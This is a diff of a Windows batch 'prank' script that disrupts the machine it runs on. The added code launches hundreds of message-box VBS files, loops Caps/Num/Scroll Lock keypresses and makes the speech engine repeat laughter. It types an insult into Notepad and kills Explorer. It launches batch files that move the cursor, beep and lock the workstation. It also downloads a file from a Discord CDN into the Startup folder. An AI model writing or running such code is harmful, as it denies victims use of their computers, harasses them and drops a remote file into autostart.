@@ -1,10 +1,167 @@
 @echo off
 mode 30 , 01
 powershell -window minimized -command "" 
-cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-powershell wget -outf tittl.mp3 https://cdn.discordapp.com/attachments/806596260735614999/820859736241078303/rirck.mp3
 cd C:\Users\%username%\Desktop
+echo X=MsgBox(".........................",0+48,".") >> hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+echo Dim speaks, speech >> n.vbs
+echo speaks="jajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajaja" >> n.vbs
+echo Set speech=CreateObject("sapi.spvoice") >> n.vbs
+echo speech.Speak speaks >> n.vbs
+echo Set wshShell =wscript.CreateObject("WScript.Shell") >> kbm.vbs
+echo do >> kbm.vbs
+echo wscript.sleep 100 >> kbm.vbs
+echo wshshell.sendkeys "{CAPSLOCK}" >> kbm.vbs
+echo wshshell.sendkeys "{NUMLOCK}" >> kbm.vbs
+echo wshshell.sendkeys "{SCROLLLOCK}" >> kbm.vbs
+echo loop >> kbm.vbs
 cd C:\Users\%username%\Desktop
+start kmb.vbs
 cd C:\Users\%username%\Desktop
 echo @echo off >> ppppppppppppppp.bat
 echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
@@ -40,6 +197,96 @@ echo rundll32.exe user32.dll,MessageBeep >> s44ss1541DDDDD44.bat
 echo exit >> s44ss1541DDDDD44.bat
 cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
 TASKKILL /F /IM EXPLORER.EXE
 start explorer.exe
 start ppppppppppppppp.bat
@@ -320,7 +567,10 @@ echo RunDll32.exe user32.dll,SetCursorPos >> notvi.bat
 echo timeout 15 > NUL >> notvi.bat
 echo RunDll32.exe user32.dll,LockWorkStation >> notvi.bat
 echo exit >> notvi.bat
-
+echo Set wshShell = wscript.CreateObject ("WScript.Shell") >> sssss5.vbs
+echo Wshshell.run "Notepad" >> sssss5.vbs
+echo wscript.sleep 100 >> sssss5.vbs
+echo wshshell.sendkeys "jajajajajajajajajajaja sos un tonto" >> sssss5.vbs
 cd C:\Users\%username%\Desktop
 start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
@@ -380,5 +630,5 @@ start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
 start ppppppppppppppp.bat
 start s44ss1541DDDDD44.bat
-start s44ss1541DDDDD44.bat
-start ppppppppppppppp.bat
+cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+powershell wget -outf tittl.mp3 https://cdn.discordapp.com/attachments/806596260735614999/820859736241078303/rirck.mp3
